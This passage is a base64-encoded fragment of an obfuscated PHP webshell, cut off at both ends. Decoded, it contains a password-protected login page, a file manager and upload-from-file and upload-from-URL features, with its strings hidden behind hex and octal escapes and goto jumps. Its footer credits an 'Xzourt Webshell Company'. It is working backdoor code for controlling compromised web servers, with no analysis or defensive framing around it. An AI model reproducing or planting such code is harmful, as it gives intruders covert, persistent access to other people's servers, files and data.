wxNjVcMTYzXDE2MiJdXSkgJiYgaXNzZXQoJF9QT1NUWyJceDY2XDE1NVx4NWZcMTYwXHg3N1x4NjQiXSkgJiYgcGFzc3dvcmRfdmVyaWZ5KCRfUE9TVFsiXHg2Nlx4NmRcMTM3XHg3MFx4NzdceDY0Il0sICRhdXRoX3VzZXJzWyRfUE9TVFsiXDE0NlwxNTVceDVmXHg3NVx4NzNcMTYyIl1dKSkgeyAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bIlx4NmNceDZmXDE0N1wxNDdcMTQ1XHg2NCJdID0gJF9QT1NUWyJceDY2XHg2ZFx4NWZcMTY1XDE2M1wxNjIiXTsgZm1fc2V0X21zZyhsbmcoIlwxMzFceDZmXDE2NVx4MjBcMTQxXHg3MlwxNDVcNDBcMTU0XHg2ZlwxNDdcMTQ3XDE0NVwxNDRceDIwXHg2OVwxNTYiKSk7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlw3N1wxNjBceDNkIik7IH0gZWxzZSB7IHVuc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2Y1wxNTdcMTQ3XHg2N1wxNDVcMTQ0Il0pOyBmbV9zZXRfbXNnKGxuZygiXHg0Y1wxNTdcMTQ3XHg2OVwxNTZceDIwXDE0NlwxNDFcMTUxXDE1NFwxNDVcMTQ0XHgyZVw0MFwxMTFceDZlXHg3Nlx4NjFceDZjXDE1MVwxNDRceDIwXDE2NVx4NzNceDY1XDE2MlwxNTZcMTQxXDE1NVx4NjVceDIwXHg2ZlwxNjJceDIwXDE2MFwxNDFceDczXHg3M1wxNjdceDZmXDE2Mlx4NjQiKSwgIlx4NjVcMTYyXDE2MlwxNTdcMTYyIik7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMKTsgfSB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXDE2MFx4NjFcMTYzXDE2M1x4NzdcMTU3XHg3Mlx4NjRceDVmXHg2OFwxNDFcMTYzXDE1MFw0MFwxNTZcMTU3XDE2NFx4MjBceDczXDE2NVx4NzBcMTYwXHg2ZlwxNjJceDc0XHg2NVx4NjRceDJjXDQwXDEyNVx4NzBceDY3XDE2Mlx4NjFceDY0XHg2NVw0MFx4NTBceDQ4XDEyMFw0MFwxNjZceDY1XDE2Mlx4NzNceDY5XDE1N1x4NmUiKSwgIlx4NjVceDcyXHg3MlwxNTdcMTYyIik7IH0gfSBlbHNlIHsgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJceDZjXHg2ZlwxNDdcMTQ3XHg2NVwxNDQiXSk7IGZtX3Nob3dfaGVhZGVyX2xvZ2luKCk7ID8+CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9ImgtMTAwIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIGgtMTAwIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtbWQtY2VudGVyIGgtMTAwIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXdyYXBwZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIGZhdCA8P3BocCAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0tc2lnbmluIiBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBhdXRvY29tcGxldGU9Im9mZiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJicmFuZCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgdmVyc2lvbj0iMS4wIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgMTkwLjAwMDAwMCAyNjUuMDAwMDAwIgogcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQgbWVldCI+Cgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCwyNjUuMDAwMDAwKSBzY2FsZSgwLjEwMDAwMCwtMC4xMDAwMDApIgpmaWxsPSIjMDAwMDAwIiBzdHJva2U9Im5vbmUiPgo8cGF0aCBkPSJNMCAxNjE1IGwwIC0xMDM2IDQ0IDMwIGM0NCAzMCA0NCAzMCA1MCA4IDE3IC02NCAxIC0xNTEgLTc0IC00MTIKLTExIC0zOSAtMjAgLTk5IC0yMCAtMTM3IGwwIC02OCA5MjAgMCA5MjAgMCAwIDI5IGMwIDUyIC01MSAyNzUgLTcyIDMxMiAtMTkKMzQgLTIwIDUxIC0xNyAyNTcgMyAxNTEgOCAyMjUgMTYgMjMzIDkgOSAyNiA3IDcyIC05IGw2MSAtMjEgMCA5MjUgMCA5MjQKLTk1MCAwIC05NTAgMCAwIC0xMDM1eiBtMTEwNyA4MDkgYy0zIC0zIC0xMiAtNCAtMTkgLTEgLTggMyAtNSA2IDYgNiAxMSAxIDE3Ci0yIDEzIC01eiBtMjgzIC0xNzQgYzAgLTUgLTIgLTEwIC00IC0xMCAtMyAwIC04IDUgLTExIDEwIC0zIDYgLTEgMTAgNCAxMCA2CjAgMTEgLTQgMTEgLTEweiBtMTEzIC0xODUgYzE4IC0zMyAyMiAtNTYgMjIgLTEzNSAwIC01MiAtMyAtMTA3IC03IC0xMjIgbC04Ci0yNiAtNTYgMTUgYy01NiAxNCAtMTEwIDExIC0xMDAgLTYgMyAtNSAyMyAtMTIgNDMgLTE2IDczIC0xMyAxMTAgLTQ1IDk3IC04MAotNyAtMTcgLTMxIC0yMCAtMzYgLTUgLTIgNiAtMjkgMTMgLTYwIDE2IC01OCA2IC05OCAtNiAtOTggLTI5IDAgLTcgNCAtNiAxMAozIDkgMTMgMTQgNyAxMSAtMTIgMCAtNCAxMSAtMTEgMjYgLTE0IDE4IC01IDMwIC0yIDM4IDEwIDE2IDIyIDMyIDIwIDM4IC00IDUKLTE5IC0zIC0yNCAtNDAgLTIzIC0yMiAxIC0xNCAtNiAyMiAtMjEgMjYgLTExIDQzIC0xMyA2MSAtNiAxNCA2IDI3IDEwIDI5IDEwCjggMCAtMTggLTkxIC00MiAtMTQ1IC0yOSAtNjUgLTUwIC05OSAtMTAwIC0xNTQgLTE4IC0yMCAtMzMgLTQ0IC0zMyAtNTMgMAotMTIgLTUgLTE1IC0xNiAtMTEgLTExIDQgLTE1IDEgLTEyIC0xMyAyIC0xMCAtMSAtMTkgLTcgLTE5IC0yMyAtMSAtNTUgLTI3Ci00OSAtMzggNCAtNyAzIC05IC0xIC00IC01IDQgLTIxIC01IC0zNiAtMTkgLTMwIC0yOSAtNTQgLTQ0IC0xMDkgLTcwIC02OAotMzIgLTE4NCA1IC0yMzAgNzMgLTE0IDIxIC0zMyA0NyAtNDQgNTggLTE0IDE2IC03NiAxMzIgLTEyMCAyMjcgLTUgMTAgLTcgMTAKLTEyIDEgLTggLTE4IC0yNSAtMTYgLTE4IDIgNCA4IDEgMTUgLTQgMTUgLTYgMCAtMTMgOCAtMTUgMTggLTMgOSAtNSAyIC02Ci0xNSAtMiAtNTAgLTE4IC0zOSAtMTcgMTEgMCAzNSAzIDQzIDE2IDM5IDggLTMgMyA1IC0xMiAxOCAtNDYgNDAgLTY4IDExNQotNjggMjMwIDAgOTMgMiAxMDIgMjUgMTI0IDEzIDE0IDI4IDI1IDM0IDI1IDEwIDAgMjMgLTMxIDIwIC00NiAtNSAtMTggMTQKLTg5IDI1IC05NiA2IC00IDEyIC00MiAxMyAtODUgMSAtNDMgMiAtODIgMyAtODggMyAtMjEgMjAgNTMgMjYgMTE0IDcgNzkgNTkKMTk3IDExMiAyNTYgOTUgMTA2IDEyOCAxNDQgMTQxIDE2MyAyNCAzNCAzMiAxNCAxMSAtMjYgLTY5IC0xMzIgLTEyMiAtMjY4Ci0xMjIgLTMxNSAxIC0yMCAtMyAtMzUgLTggLTMyIC0yNCAxNSAtMjkgLTIxNCAtNyAtMzAwIGwxNCAtNTAgLTEgOTAgYy0xIDExMwoxMiAyMjEgMjggMjM4IDcgNyAxOCAyMiAyNCAzNCA3IDEyIDIwIDIxIDMwIDIxIDkgMCAyNSAzIDM1IDcgMTAgNCAxNyAzIDE3Ci0zIDAgLTEzIDI4IC00MiA0MCAtNDIgNSAwIDE2IDcgMjUgMTYgMTUgMTUgMTcgMTUgMzAgLTIgMTAgLTE0IDEwIC0yMSAyIC0yNgotOCAtNSAtNiAtOCA2IC04IDIyIDAgMjIgMjYgLTEgNTMgLTE5IDI0IC0xOSAyNCAtMTA0IDQwIC02MyAxMSAtNjkgMjIgLTQzCjY3IDggMTQgMjMgNDMgMzUgNjYgMzAgNjAgMTA5IDE1NCAxNTUgMTg2IDM2IDI0IDUwIDI3IDEzNSAyOSA1MiAxIDEwNCA2IDExNQo5IDE2IDYgMzAgLTMgNjMgLTM5IDIzIC0yNSA1MyAtNjQgNjUgLTg2eiBtLTkwMiAtOTggYy04IC04IC0xNCAtNyAtMjMgMiAtOAo5IC04IDExIC0yIDggNyAtNCAxNSAxIDE5IDExIDUgMTIgOSAxNCAxMiA0IDMgLTggMCAtMTkgLTYgLTI1eiBtLTggLTQ3NyBjLTMKLTExIDAgLTI3IDcgLTM1IDExIC0xMyAxMCAtMTQgLTMgLTkgLTIxIDggLTMwIDM0IC0xNiA1MCAxNiAxOSAxOCAxOCAxMiAtNnoKbTg0NyAtMTMyIGMwIC0xNiAtMyAtMTkgLTExIC0xMSAtNiA2IC04IDE2IC01IDIyIDExIDE3IDE2IDEzIDE2IC0xMXogbS02ODUKLTExMyBjMTggLTM3IDEyNiAtMTU1IDE0MSAtMTU1IDMgMCAxOCAtOCAzMiAtMTggNTMgLTM1IDEwMCAtNDUgMTUxIC0zMSAyNSA2CjUyIDE2IDU5IDIyIDggNiAxNyA1IDI2IC0yIDggLTYgMjAgLTEwIDI3IC05IDggMiAxMyAtMiAxMiAtOSAtMiAtNyAzIC0xMCAxMQotNyA5IDMgMTMgLTUgMTIgLTMxIC0xIC0yMCAtNiAtMzUgLTEzIC0zNSAtNiAwIC0xNSAtOSAtMTggLTIwIC0zIC0xMSAtMTAKLTIwIC0xNSAtMjAgLTUgMCAtMTEgLTEzIC0xNSAtMjkgLTMgLTE2IC0xMyAtMzIgLTIxIC0zNSAtOCAtMyAtMTQgLTEzIC0xNAotMjEgMCAtOSAtNSAtMTMgLTExIC0xMCAtNiA0IC0xMyAtMyAtMTYgLTE1IC00IC0xNSAtOCAtMTggLTEzIC0xMCAtMTAgMTYKLTMwIDQgLTMwIC0xOCAwIC0xNSAyIC0xNSAxMCAtMiA3IDExIDEwIDExIDEwIDIgMCAtMTAgNSAtMTAgMjAgLTIgMTEgNiAxNwoxNiAxNCAyMiAtNSA4IC0xIDkgMTAgNSAxMiAtNSAxOSAwIDI2IDE2IDUgMTIgOSAxNyA5IDExIDIgLTMxIDkxIDIzIDkxIDU1IDAKNSA0IDExIDkgMTMgMTUgNSAyMSA1NiA4IDYyIC03IDIgLTIgNSAxMSA1IDI0IDEgMzMgLTEzIDM2IC01NCAwIC0xNSA2IC0yMwoxMyAtMjEgNiAzIDEzIDEgMTUgLTMgNCAtMTEgMjM2IC02MSAyNzkgLTYxIDI4IDAgMzEgLTMgMjQgLTIyIC0yMSAtNzEgLTE1Ci0zMDQgMTEgLTM5NSBsNiAtMjMgLTIyOCAxIGMtMTI2IDAgLTI3MiAtNCAtMzI0IC0xMCAtNTIgLTUgLTEwNCAtOSAtMTE1IC05Ci00MCAtMSAtMjIxIC0yMSAtMjc0IC0zMiAtNzAgLTEzIC02NiAtMTQgLTY5IDE2IC0xIDE5IDIgMjUgMTIgMjEgMTIgLTUgMTIgMAo1IDI2IC01IDE4IC05IDQ5IC05IDcxIDAgNTEgMjEgMTY2IDMwIDE2MSAxMCAtNiA1IDI3IC03IDQ5IC05IDE2IC03IDkzIDIKMTA0IDEgMiAyNCAtNyA1MCAtMjAgNDMgLTIxIDQ3IC0yMiA1NiAtNSA2IDkgMjAgMTcgMzIgMTggMTIgMCAtMyA4IC0zMyAxNwotMzUgMTIgLTU5IDI1IC02NiA0MCAtNiAxMiAtMTQgMTkgLTE3IDE2IC0zIC00IC02IDIgLTYgMTIgMSAxMSAtMiAyOSAtNiA0MgotNSAxNSAtMyAyMiA1IDIyIDkgMCAxMSAxNSA2IDYwIC00IDMzIC00IDExNiAwIDE4NCA3IDEzMyAxMSAxMzcgNDkgNjF6IG02MDkKMjQgYy0zIC01IC0xMCAtNyAtMTUgLTMgLTUgMyAtNyAxMCAtMyAxNSAzIDUgMTAgNyAxNSAzIDUgLTMgNyAtMTAgMyAtMTV6Cm00MyAtNSBjLTMgLTMgLTEyIC00IC0xOSAtMSAtOCAzIC01IDYgNiA2IDExIDEgMTcgLTIgMTMgLTV6IG0tMTg5IC0zODkgYy0zCi0zIC05IDIgLTEyIDEyIC02IDE0IC01IDE1IDUgNiA3IC03IDEwIC0xNSA3IC0xOHogbS00MzggLTg1IGMwIC01IC00IC0xMAotMTAgLTEwIC01IDAgLTEwIDUgLTEwIDEwIDAgNiA1IDEwIDEwIDEwIDYgMCAxMCAtNCAxMCAtMTB6Ii8+CjxwYXRoIGQ9Ik0xMDk0IDE4OTUgYzM2IC0xOSA0NyAtMTkgMjIgMCAtMTEgOCAtMjcgMTUgLTM1IDE1IC05IDAgLTMgLTcgMTMKLTE1eiIvPgo8cGF0aCBkPSJNNTkwIDE4NzAgYy0xMiAtOCAtMTEgLTEwIDcgLTEwIDEyIDAgMjUgNSAyOCAxMCA4IDEzIC0xNSAxMyAtMzUgMHoiLz4KPHBhdGggZD0iTTEwOTAgMTUwMCBjMCAtNSA0IC0xMCA5IC0xMCA2IDAgMTMgNSAxNiAxMCAzIDYgLTEgMTAgLTkgMTAgLTkgMAotMTYgLTQgLTE2IC0xMHoiLz4KPHBhdGggZD0iTTExNjUgMTQ3MCBjLTMgLTUgMyAtMTAgMTQgLTEwIDExIDAgMjMgNSAyNiAxMCAzIDYgLTMgMTAgLTE0IDEwCi0xMSAwIC0yMyAtNCAtMjYgLTEweiIvPgo8cGF0aCBkPSJNOTY0IDEzNjUgYzIyIC0xNyAzNiAtMTkgMzYgLTYgMCAxNSA1NCAtMSA4MyAtMjUgMTYgLTEzIDI1IC0yNCAyMAotMjUgLTQgMCAxIC00IDEyIC05IDI3IC0xMiA3NSAtMTIgNzUgLTEgMCAxNSAtNDIgNDEgLTY3IDQxIC0xMiAwIC0zNyA5IC01NQoyMCAtMjAgMTIgLTUwIDIwIC03OCAyMCAtNDIgLTEgLTQ0IC0yIC0yNiAtMTV6Ii8+CjxwYXRoIGQ9Ik05NjAgODAxIGMwIC02IDkgLTggMjAgLTYgMTEgMiAyMyAtMSAyNiAtNyA0IC03IDIgLTggLTQgLTQgLTcgNAotMTIgMSAtMTIgLTggMCAtOSA1IC0xNiAxMSAtMTYgNSAwIDcgLTYgMyAtMTIgLTQgLTcgMiAtNCAxNCA2IDM1IDMxIDI4IDUxCi0xOCA1NCAtMjIgMSAtNDAgLTIgLTQwIC03eiIvPgo8cGF0aCBkPSJNODY2IDc5MiBjLTMgLTUgMSAtOSA5IC05IDggMCAxNSA0IDE1IDkgMCA0IC00IDggLTkgOCAtNiAwIC0xMiAtNAotMTUgLTh6Ii8+CjxwYXRoIGQ9Ik05MDggNzkzIGM3IC0zIDE2IC0yIDE5IDEgNCAzIC0yIDYgLTEzIDUgLTExIDAgLTE0IC0zIC02IC02eiIvPgo8cGF0aCBkPSJNMTA2MCA2MjkgYzAgLTUgNSAtNyAxMCAtNCA2IDMgMTAgOCAxMCAxMSAwIDIgLTQgNCAtMTAgNCAtNSAwIC0xMAotNSAtMTAgLTExeiIvPgo8cGF0aCBkPSJNODE1IDU0MCBjMyAtNSA4IC0xMCAxMSAtMTAgMiAwIDQgNSA0IDEwIDAgNiAtNSAxMCAtMTEgMTAgLTUgMCAtNwotNCAtNCAtMTB6Ii8+CjxwYXRoIGQ9Ik05MDAgNTA1IGMwIC04IDIgLTE1IDQgLTE1IDIgMCA2IDcgMTAgMTUgMyA4IDEgMTUgLTQgMTUgLTYgMCAtMTAKLTcgLTEwIC0xNXoiLz4KPHBhdGggZD0iTTk0NiA0NjcgYzMgLTEwIDkgLTE1IDEyIC0xMiAzIDMgMCAxMSAtNyAxOCAtMTAgOSAtMTEgOCAtNSAtNnoiLz4KPHBhdGggZD0iTTg0MCA0MjkgYzAgLTUgNSAtNyAxMCAtNCA2IDMgMTAgOCAxMCAxMSAwIDIgLTQgNCAtMTAgNCAtNSAwIC0xMAotNSAtMTAgLTExeiIvPgo8L2c+Cjwvc3ZnPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgxIGNsYXNzPSJjYXJkLXRpdGxlIj48P3BocCAgZWNobyBBUFBfVElUTEU7ID8+CjwvaDE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxociAvPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZtX3VzciI+PD9waHAgIGVjaG8gbG5nKCJcMTI1XDE2M1wxNDVceDcyXDE1Nlx4NjFceDZkXDE0NSIpOyA/Pgo8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbV91c3IiIG5hbWU9ImZtX3VzciIgcmVxdWlyZWQgYXV0b2ZvY3VzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZm1fcHdkIj48P3BocCAgZWNobyBsbmcoIlx4NTBcMTQxXDE2M1wxNjNceDc3XDE1N1wxNjJceDY0Iik7ID8+CjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbV9wd2QiIG5hbWU9ImZtX3B3ZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZm1fc2hvd19tZXNzYWdlKCk7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyBidG4tYmxvY2sgbXQtNCIgcm9sZT0iYnV0dG9uIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZWNobyBsbmcoIlx4NGNcMTU3XHg2N1wxNTFceDZlIik7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIgdGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJm1kYXNoOyZtZGFzaDsgJmNvcHk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3QubWUveHpvdXJ0IiB0YXJnZXQ9Il9ibGFuayIgY29sb3I9ImdyZWVuIiBjbGFzcz0idGV4dC1tdXRlZCIgZGF0YS12ZXJzaW9uPSI8P3BocCAgZWNobyBWRVJTSU9OOyA/PgoiPlh6b3VydCBXZWJzaGVsbCBDb21wYW55PC9hPiAmbWRhc2g7Jm1kYXNoOwogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L3NlY3Rpb24+CgogICAgICAgIDw/cGhwICBmbV9zaG93X2Zvb3Rlcl9sb2dpbigpOyBkaWU7IH0gfSBnb3RvIHRfOTdfOyBvNTQzYTogaWYgKGlzc2V0KCRfR0VUWyJceDc1XDE2MFx4NmNceDZmXDE0MVwxNDQiXSkgJiYgIUZNX1JFQURPTkxZKSB7IGZtX3Nob3dfaGVhZGVyKCk7IGZtX3Nob3dfbmF2X3BhdGgoRk1fUEFUSCk7IGZ1bmN0aW9uIGdldFVwbG9hZEV4dCgpIHsgJGV4dEFyciA9IGV4cGxvZGUoIlx4MmMiLCBGTV9VUExPQURfRVhURU5TSU9OKTsgaWYgKEZNX1VQTE9BRF9FWFRFTlNJT04gJiYgJGV4dEFycikgeyBhcnJheV93YWxrKCRleHRBcnIsIGZ1bmN0aW9uICgmJHgpIHsgJHggPSAiXDU2eyR4fSI7IH0pOyByZXR1cm4gaW1wbG9kZSgiXDU0IiwgJGV4dEFycik7IH0gcmV0dXJuICcnOyB9ID8+CgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZHJvcHpvbmUvNS41LjEvbWluL2Ryb3B6b25lLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICA8ZGl2IGNsYXNzPSJwYXRoIj4KCiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBtYi0yIGZtLXVwbG9hZC13cmFwcGVyIDw/cGhwICBlY2hvIGZtX2dldF90aGVtZSgpOyA/PgoiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+CiAgICAgICAgICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtdGFicyBjYXJkLWhlYWRlci10YWJzIj4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iI2ZpbGVVcGxvYWRlciIgZGF0YS10YXJnZXQ9IiNmaWxlVXBsb2FkZXIiPjxpIGNsYXNzPSJmYSBmYS1hcnJvdy1jaXJjbGUtby11cCI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NTVcMTYwXHg2Y1x4NmZcMTQxXDE0NFwxNTFceDZlXHg2N1x4NDZcMTUxXDE1NFwxNDVceDczIik7ID8+CjwvYT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9IiN1cmxVcGxvYWRlciIgY2xhc3M9ImpzLXVybC11cGxvYWQiIGRhdGEtdGFyZ2V0PSIjdXJsVXBsb2FkZXIiPjxpIGNsYXNzPSJmYSBmYS1saW5rIj48L2k+IFVwbG9hZCBmcm9tIFVSTDwvYT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0iY2FyZC10ZXh0Ij4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/cD08P3BocCAgZWNobyBGTV9QQVRIOyA/PgoiIGNsYXNzPSJmbG9hdC1yaWdodCI+PGkgY2xhc3M9ImZhIGZhLWNoZXZyb24tY2lyY2xlLWxlZnQgZ28tYmFjayI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMDJceDYxXHg2M1wxNTMiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBlY2hvIGxuZygiXDEwNFx4NjVcMTYzXHg3NFwxNTFceDZlXDE0MVx4NzRcMTUxXHg2Zlx4NmVceDQ2XHg2Zlx4NmNcMTQ0XDE0NVwxNjIiKTsgPz4KOiA8P3BocCAgZWNobyBmbV9lbmMoZm1fY29udmVydF93aW4oRk1fUEFUSCkpOyA/PgogICAgICAgICAgICAgICAgPC9wPgoKICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iPD9waHAgIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhGTV9TRUxGX1VSTCkgLiAiXHgzZlwxNjBceDNkIiAuIGZtX2VuYyhGTV9QQVRIKTsgPz4KIiBjbGFzcz0iZHJvcHpvbmUgY2FyZC10YWJzLWNvbnRhaW5lciIgaWQ9ImZpbGVVcGxvYWRlciIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwICBlY2hvIGZtX2VuYyhGTV9QQVRIKTsgPz4KIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmdWxscGF0aCIgaWQ9ImZ1bGxwYXRoIiB2YWx1ZT0iPD9waHAgIGVjaG8gZm1fZW5jKEZNX1BBVEgpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZhbGxiYWNrIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImZpbGUiIHR5cGU9ImZpbGUiIG11bHRpcGxlLz4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZm9ybT4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1cGxvYWQtdXJsLXdyYXBwZXIgY2FyZC10YWJzLWNvbnRhaW5lciBoaWRkZW4iIGlkPSJ1cmxVcGxvYWRlciI+CiAgICAgICAgICAgICAgICAgICAgPGZvcm0gaWQ9ImpzLWZvcm0tdXJsLXVwbG9hZCIgY2xhc3M9ImZvcm0taW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIHVwbG9hZF9mcm9tX3VybCh0aGlzKTsiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0eXBlIiB2YWx1ZT0idXBsb2FkIiBhcmlhLWxhYmVsPSJoaWRkZW4iIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InVybCIgcGxhY2Vob2xkZXI9IlVSTCIgbmFtZT0idXBsb2FkdXJsIiByZXF1aXJlZCBjbGFzcz0iZm9ybS1jb250cm9sIiBzdHlsZT0id2lkdGg6IDgwJSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IG1sLTMiPjw/cGhwICBlY2hvIGxuZygiXHg1NVx4NzBceDZjXDE1N1x4NjFcMTQ0Iik7ID8+CjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsZHMtZmFjZWJvb2siPjxkaXY+PC9kaXY+PGRpdj48L2Rpdj48ZGl2PjwvZGl2PjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJqcy11cmwtdXBsb2FkX19saXN0IiBjbGFzcz0iY29sLTkgbXQtMyI+PC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nk